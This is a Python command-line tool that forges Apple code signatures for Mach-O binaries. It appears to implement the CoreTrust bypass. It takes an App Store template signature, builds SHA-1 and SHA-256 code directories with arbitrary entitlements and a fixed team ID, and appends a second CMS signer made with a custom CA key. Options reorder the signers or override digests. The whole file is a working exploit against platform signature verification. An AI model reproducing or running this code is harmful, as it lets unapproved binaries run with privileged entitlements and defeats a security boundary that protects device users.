#!/usr/bin/env python3
import sys, os, struct, hashlib, plistlib, re
sys.path.insert(0,'/home/femboychik/work/cthelper')
sys.path.insert(0,'/home/femboychik/work/cttest')
import sign_helper2 as SH
import mkct
from asn1crypto import cms, core, x509 as ax509
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

TEAM='T8ALTGMVXN'
ROOT='/home/femboychik/work/choma/tests/ct_bypass'

def arr(path,name):
    s=open(path).read()
    m=re.search(r'unsigned char\s+'+name+r'\[\]\s*=\s*\{(.*?)\};',s,re.S)
    if not m:
        m=re.search(r'unsigned char\s+'+name+r'\[.*?\]\s*=\s*\{(.*?)\};',s,re.S)
    vals=[int(x,16) for x in re.findall(r'0x([0-9a-fA-F]{1,2})',m.group(1))]
    return bytes(vals)

BLOB=arr(ROOT+'/TemplateSignatureBlob.h','AppStoreSignatureBlob')
TEMPLATE_CMS=BLOB[8:struct.unpack('>I',BLOB[4:8])[0]]
CA_CERT=arr(ROOT+'/CADetails.h','CACert')
CA_KEY=arr(ROOT+'/CADetails.h','CAKey')

class OrderedSignerInfos(cms.SignerInfos):
    def _set_contents(self, force=False):
        if self.children is None: self._parse_children()
        self._contents=b''.join(c.dump(force=force) for c in self)
        self._header=None
        if self._trailer!=b'': self._trailer=b''

class OrderedCertificateSet(cms.CertificateSet):
    def _set_contents(self, force=False):
        if self.children is None: self._parse_children()
        self._contents=b''.join(c.dump(force=force) for c in self)
        self._header=None
        if self._trailer!=b'': self._trailer=b''

def build_cd_team(code, code_limit, ident, team_id, hash_type=2, flags=0, slot5=None, version=0x20400, slots=None):
    hash_size=20 if hash_type==1 else 32
    h=hashlib.sha1 if hash_type==1 else hashlib.sha256
    nslots=(code_limit+0xfff)//0x1000
    hashes=b''
    for i in range(nslots):
        a=i*0x1000; b=min((i+1)*0x1000,code_limit)
        chunk=code[a:b]
        if len(chunk)<0x1000: chunk+=b'\0'*(0x1000-len(chunk))
        hashes+=h(chunk).digest()
    ident_b=ident.encode()+b'\0'; ident_off=0x58
    team_b=team_id.encode()+b'\0'; team_off=ident_off+len(ident_b)
    special_start=(team_off+len(team_b)+3)&~3
    hash_off=special_start+SH.NSLOTS_SPECIAL*hash_size
    length=hash_off+len(hashes)
    hdr=struct.pack('>IIIIIIIII',0xfade0c02,length,version,flags,hash_off,ident_off,SH.NSLOTS_SPECIAL,nslots,code_limit)
    hdr+=struct.pack('>BBBB',hash_size,hash_type,0,12)
    hdr+=struct.pack('>III',0,team_off,0)
    hdr+=struct.pack('>I',0)
    hdr+=struct.pack('>QQQQ',0,0,0,0)
    assert len(hdr)==0x58
    special=bytearray(SH.NSLOTS_SPECIAL*hash_size)
    if slot5: special[5*hash_size:6*hash_size]=slot5[:hash_size]
    if slots:
        for _idx,_h in slots.items():
            special[int(_idx)*hash_size:(int(_idx)+1)*hash_size]=_h[:hash_size]
    cd=hdr+ident_b+team_b+b'\0'*(special_start-team_off-len(team_b))+bytes(special)+hashes
    return cd

def build_cms(sha1, sha256, md_override=None, order='apple_first'):
    ci=cms.ContentInfo.load(TEMPLATE_CMS); sd=ci['content']; si0=sd['signer_infos'][0]
    md=None
    for a in si0['signed_attrs']:
        if a['type'].native=='message_digest':
            md=a['values'][0].native; break
    assert md is not None
    if md_override is not None: md=md_override
    xml=plistlib.dumps({'cdhashes':[sha1,sha256[:20]]}, fmt=plistlib.FMT_XML)
    der=bytearray(mkct.DERTemplate); der[11:31]=sha1; der[46:78]=sha256
    attrs=cms.CMSAttributes([
        cms.CMSAttribute({'type':'content_type','values':['data']}),
        cms.CMSAttribute({'type':'message_digest','values':[md]}),
        cms.CMSAttribute({'type':'1.2.840.113635.100.9.1','values':[core.OctetString(xml)]}),
        cms.CMSAttribute({'type':'1.2.840.113635.100.9.2','values':[core.SequenceOf.load(b'\x30\x4e'+bytes(der))]}),
    ])
    items=[a for a in attrs]; items.sort(key=lambda a:a.dump()); attrs=cms.CMSAttributes(items)
    cert=x509.load_pem_x509_certificate(CA_CERT); key=serialization.load_pem_private_key(CA_KEY,password=None)
    cert_asn1=ax509.Certificate.load(cert.public_bytes(serialization.Encoding.DER))
    raw=attrs.dump(); signed=b'\x31'+raw[1:] if raw[0]==0xA0 else raw
    sig=key.sign(signed, padding.PKCS1v15(), hashes.SHA256())
    sid=cms.SignerIdentifier({'issuer_and_serial_number':cms.IssuerAndSerialNumber({'issuer':cert_asn1.issuer,'serial_number':cert_asn1.serial_number})})
    si=cms.SignerInfo({'version':'v1','sid':sid,
        'digest_algorithm':{'algorithm':'sha256','parameters':core.Null()},
        'signed_attrs':attrs,
        'signature_algorithm':{'algorithm':'sha256_rsa','parameters':core.Null()},
        'signature':sig})
    apple_si=sd['signer_infos'][0]
    if order=='ours_first':
        sd['signer_infos']=OrderedSignerInfos([si,apple_si])
        sd['certificates']=OrderedCertificateSet([cert_asn1]+list(sd['certificates']))
    else:
        sd['signer_infos']=OrderedSignerInfos([apple_si,si])
        sd['certificates']=OrderedCertificateSet(list(sd['certificates'])+[cert_asn1])
    return ci.dump()

def find_lc(d):
    ncmds=struct.unpack_from('<I',d,16)[0]; off=32
    for _ in range(ncmds):
        cmd,cs=struct.unpack_from('<II',d,off)
        if cmd==0x1d:
            return off,struct.unpack_from('<II',d,off+8)[0]
        off+=cs
    return None

def sign_variant(in_path, out_path, ident, ent_xml, info_blob=None, cr_blob=None,
                 variant='modcd', md_mode='template', order='apple_first'):
    d=open(in_path,'rb').read()
    lc=find_lc(d)
    if lc:
        lc_off,sig_off=lc; b=bytearray(d)
    else:
        b,lc_off=SH.add_lc(d); sig_off=(len(b)+15)&~15
    le_off=SH.find_linkedit(bytes(b))
    if le_off is None: raise SystemExit('no __LINKEDIT')
    le_fileoff=struct.unpack_from('<Q',b,le_off+40)[0]
    ent_blob=struct.pack('>II',0xfade7171,8+len(ent_xml))+ent_xml if ent_xml else None

    def make_sb(base, sb_len):
        tmp=bytearray(base)
        struct.pack_into('<II',tmp,lc_off+8,sig_off,sb_len)
        def cd(hash_type, version):
            hs=20 if hash_type==1 else 32
            h=hashlib.sha1 if hash_type==1 else hashlib.sha256
            slots={}
            if info_blob: slots[1]=h(info_blob).digest()
            if cr_blob: slots[3]=h(cr_blob).digest()
            if ent_blob: slots[5]=h(ent_blob).digest()
            return build_cd_team(bytes(tmp),sig_off,ident,TEAM,hash_type=hash_type,version=version,slots=slots)
        app_cd=cd(1,0x20500); real_cd=cd(2,0x20400)
        if md_mode=='app': md=hashlib.sha256(app_cd).digest()
        elif md_mode=='real': md=hashlib.sha256(real_cd).digest()
        else: md=None
        cms_data=build_cms(hashlib.sha1(app_cd).digest(), hashlib.sha256(real_cd).digest(), md_override=md, order=order)
        cms_blob=struct.pack('>II',0xfade0b01,8+len(cms_data))+cms_data
        if variant=='swap':
            entries=[(0,real_cd),(0x1000,app_cd)]
        else:
            entries=[(0,app_cd),(0x1000,real_cd)]
        if ent_blob is not None: entries.append((5,ent_blob))
        entries.append((0x10000,cms_blob))
        return tmp,app_cd,real_cd,cms_data,SH.superblob(entries)

    tmp,app_cd,real_cd,cms_data,sb=make_sb(b,0)
    for _ in range(8):
        tmp,app_cd,real_cd,cms_data,sb2=make_sb(b,len(sb))
        if len(sb2)==len(sb):
            sb=sb2; break
        sb=sb2
    le_size=sig_off+len(sb)-le_fileoff
    tmp=bytearray(b)
    struct.pack_into('<II',tmp,lc_off+8,sig_off,len(sb))
    struct.pack_into('<Q',tmp,le_off+32,(le_size+0x3fff)&~0x3fff)
    struct.pack_into('<Q',tmp,le_off+48,le_size)
    tmp,app_cd,real_cd,cms_data,sb2=make_sb(bytes(tmp),len(sb))
    assert len(sb2)==len(sb),(len(sb2),len(sb))
    out=bytearray(bytes(tmp)[:sig_off]); out+=b'\0'*(sig_off-len(out)); out+=sb2
    open(out_path,'wb').write(out); os.chmod(out_path,0o755)
    print('signed',out_path,'variant',variant,'md',md_mode,'order',order,'size',len(out),'sig',hex(sig_off),len(sb2))
    return out

if __name__=='__main__':
    in_path,out_path,ident,entfile,variant,md_mode,order=sys.argv[1:8]
    ent=open(entfile,'rb').read() if entfile!='-' else None
    info=open(sys.argv[8],'rb').read() if len(sys.argv)>8 else None
    cr=open(sys.argv[9],'rb').read() if len(sys.argv)>9 else None
    sign_variant(in_path,out_path,ident,ent,info,cr,variant,md_mode,order)
